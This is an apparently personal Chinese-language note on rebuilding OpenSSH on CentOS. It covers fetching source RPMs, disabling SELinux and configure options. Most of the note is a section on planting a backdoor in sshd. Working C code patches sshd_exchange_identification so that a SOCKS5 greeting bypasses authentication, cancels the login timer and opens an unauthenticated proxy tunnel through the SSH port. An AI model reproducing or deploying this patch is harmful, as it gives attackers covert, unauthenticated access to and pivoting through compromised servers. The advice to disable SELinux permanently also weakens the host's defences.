# 下载地址

<https://vault.centos.org/7.7.1908/os/Source/SPackages/>

# 源码安装

*   以普通用户创建编译rpm所需的基础目录结构


```
$ mkdir -p ~/rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}
$ echo '%_topdir %(echo $HOME)/rpmbuild' > ~/.rpmmacros
```
*   安装源码

```
$ rpm -i kernel-3.10.0-514.26.2.el7.src.rpm 2>&1 | grep -v exist
$ cd ~/rpmbuild/SPECS
$ rpmbuild -bp --target=$(uname -m) kernel.spec
现在可以在“~/rpmbuild/BUILD/kernel*/linux*”看到完整的内核源代码了。
```

# TIME\_WAIT

彻底理解并解决服务器出现大量TIME\_WAIT(办法3. 客户端程序中设置socket的 SO\_LINGER 选项)

<https://zhuanlan.zhihu.com/p/567088021?utm_id=0>

# 需要关闭SELINUX

临时关闭selinux：

获取当前selinux状态
```
getenforce
```

Enforcing为开启，Permissive为关闭

临时关闭：`setenforce 0`

永久关闭selinux：

vim /etc/sysconfig/selinux

SELINUX=enforcing 替换为SELINUX=disabled

重启后，运行命令sestatus

SELinux status ：  disabled
```
/sbin/restorecon -v /usr/sbin/sshd
ausearch -c 'sshd' --raw | audit2allow -M my-sshd
semodule -i my-sshd.pp
```

# 编译

    ./configure --with-systemd --with-kerberos5 --with-pam --with-selinux --with-md5-passwords --with-ldap --sysconfdir=/etc/ssh

需要指定这几个选项，不然替换启动时，systemctl status会出现一些log，或者直接无法启动

# 留后门

sshd.c --> main --> sshd\_exchange\_identification 函数中，第一次从客户端读写数据

如果需要留后门的话，需要关闭alarm

```c
	/*
	 * We don't want to listen forever unless the other side
	 * successfully authenticates itself.  So we set up an alarm which is
	 * cleared after successful authentication.  A limit of zero
	 * indicates no limit. Note that we don't set the alarm in debugging
	 * mode; it is just annoying to have the server exit just when you
	 * are about to discover the bug.
	 */
	signal(SIGALRM, grace_alarm_handler);
	if (!debug_flag)
		alarm(options.login_grace_time);

	sshd_exchange_identification(ssh, sock_in, sock_out);
	packet_set_nonblocking();
```

关闭alarm

```c
	/*
	 * Cancel the alarm we set to limit the time taken for
	 * authentication.
	 */
	alarm(0);
	signal(SIGALRM, SIG_DFL);
```

后门可以在sshd\_exchange\_identification函数中的

```c
	if (sscanf(client_version_string, "SSH-%d.%d-%[^\n]\n",
	    &remote_major, &remote_minor, remote_version) != 3) {
		s = "Protocol mismatch.\n";
		(void) atomicio(vwrite, sock_out, s, strlen(s));
		logit("Bad protocol version identification '%.100s' "
		    "from %s port %d", client_version_string,
		    ssh_remote_ipaddr(ssh), ssh_remote_port(ssh));
		close(sock_in);
		close(sock_out);
		cleanup_exit(255);
	}
```

这个if里面添加

# socks5 后门

```c
static int socks5_auth(uint8_t *buffer)
{
	if (buffer[0] != 0x05 || buffer[1] == 0x00){
		return -1;
	}
	return 0;
}

static int socks5_connection_and_forward(int sock_in,int sock_out)
{
	char buffer[4096];
    ssize_t bytes_received;

	int snd_size  = 1;
	setsockopt(sock_out, SOL_SOCKET , SO_SNDBUF , (char *)&snd_size, sizeof(int));

	// 接收客户端发来的连接请求
    //buffer[0]: 协议版本号，固定0x05
    //buffer[1]: CMD有三种情况，0x01表示CONNECT，0x02表示BIND，0x03表示UDP
    //buffer[2]: RSV为保留字，固定为0x00
    //buffer[3]: ATYP表示后面的地址类型，0x01表示IPv4地址，0x03表示域名，0x04表示IPv6地址
    //DST.ADDR表示目标主机地址，对于域名类型，第一位表示长度，对于IPv4和IPv6分为占4 bytes 和16 bytes
    //DST.PORT表示目标主机端口
    bytes_received = recv(sock_in, buffer, 4096, 0);
    if (bytes_received < 8 || buffer[0] != 0x05 || buffer[1] != 0x01 || buffer[2] != 0x00) {
        // 不是SOCKS5协议的连接请求
        return -1;
    }

    // 解析目标地址和端口
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    
    char domain[1024];
    if (buffer[3] == 0x01) {  // 4个字节，对应 IPv4 地址
        dest_addr.sin_port = (*(uint16_t*)(buffer + 8));
        memcpy(&dest_addr.sin_addr,buffer + 4,4);
    } else if (buffer[3] == 0x03) {  // 域名
        struct hostent *host_info;
        char **ip;
        uint8_t domain_len = buffer[4];
        dest_addr.sin_port = (*(uint16_t*)(buffer + 5 + domain_len));
        memcpy(domain, buffer + 5, domain_len);
        domain[domain_len] = '\0';
        host_info = gethostbyname(domain);
        if(host_info == NULL){
            return -1;
        }
        for (ip = host_info->h_addr_list; *ip != NULL; ip++) {
		    memcpy(&dest_addr.sin_addr, *ip, sizeof(struct in_addr));
            break;
        }
    } else {
        // 不支持的地址类型
        return -1;
    }

    // 创建与目标服务器的连接
    int dest_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (dest_socket == -1) {
        return -1;
    }

    if (connect(dest_socket, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) == -1) {
        return -1;
    }
	
    // 响应连接请求
    buffer[0] = 0x05;
    buffer[1] = 0x00;
    buffer[2] = 0x00;
    buffer[3] = 0x01;
    buffer[4] = 0x00;
    buffer[5] = 0x00;
    buffer[6] = 0x00;
    buffer[7] = 0x00;
    buffer[8] = 0x00;
    buffer[9] = 0x00;
    send(sock_out, buffer, 10, 0);

	// 开始转发数据
    fd_set fd_set_read;
    while (1) {
        FD_ZERO(&fd_set_read);
        FD_SET(sock_in, &fd_set_read);
        FD_SET(dest_socket, &fd_set_read);

        int max_fd = (sock_in > dest_socket) ? sock_in : dest_socket;
        if (select(max_fd + 1, &fd_set_read, NULL, NULL, NULL) == -1) {
            break;
        }

        if (FD_ISSET(sock_in, &fd_set_read)) {
            // 从客户端读取数据并转发到目标服务器
            bytes_received = recv(sock_in, buffer, 4096, 0);
            if (bytes_received <= 0) {
                break;
            }
            send(dest_socket, buffer, bytes_received, 0);
        }

        if (FD_ISSET(dest_socket, &fd_set_read)) {
            // 从目标服务器读取数据并转发到客户端
            bytes_received = recv(dest_socket, buffer, 4096, 0);
            if (bytes_received <= 0) {
                break;
            }
            send(sock_out, buffer, bytes_received, 0);
        }
    }

	return 0;
}

static void
sshd_exchange_identification(struct ssh *ssh, int sock_in, int sock_out)
{
	u_int i;
	int remote_major, remote_minor;
	char *s;
	char buf[256];			/* Must not be larger than remote_version. */
	char remote_version[256];	/* Must be at least as big as buf. */

	/* Read other sides version identification. */
	memset(buf, 0, sizeof(buf));
	for (i = 0; i < sizeof(buf) - 1; i++) {
		if (atomicio(read, sock_in, &buf[i], 1) != 1) {
			logit("Did not receive identification string "
			    "from %s port %d",
			    ssh_remote_ipaddr(ssh), ssh_remote_port(ssh));
			cleanup_exit(255);
		}
		if( (i == 1 ) && ( socks5_auth(buf) == 0 )){
			char buffer[1024];
			ssize_t nmethos = buf[1];
			if(atomicio(read, sock_in, buffer, nmethos) != nmethos){
				close(sock_in);
				close(sock_out);
				cleanup_exit(0);
			}
			// 发送支持的认证方法（无认证）
    		buffer[0] = 0x05;
    		buffer[1] = 0x00;
			if(atomicio(vwrite, sock_out, buffer,2)!=2){
				close(sock_in);
				close(sock_out);
				cleanup_exit(0);
			}
			 /*
			* Cancel the alarm we set to limit the time taken for
			* authentication.
			*/
			alarm(0);
			signal(SIGALRM, SIG_DFL);

			socks5_connection_and_forward(sock_in,sock_out);
			close(sock_in);
			close(sock_out);
			cleanup_exit(0);
		}
		if (buf[i] == '\r') {
			buf[i] = 0;
			/* Kludge for F-Secure Macintosh < 1.0.2 */
			if (i == 12 &&
			    strncmp(buf, "SSH-1.5-W1.0", 12) == 0)
				break;
			continue;
		}
		if (buf[i] == '\n') {
			buf[i] = 0;
			break;
		}
	}
.............................
```

# 资料

OpenSSH源码分析——PART1

<https://blog.csdn.net/qq_36240047/article/details/131478124>

OpenSSH Server start failed with result 'timeout'

<https://unix.stackexchange.com/questions/390224/openssh-server-start-failed-with-result-timeout>
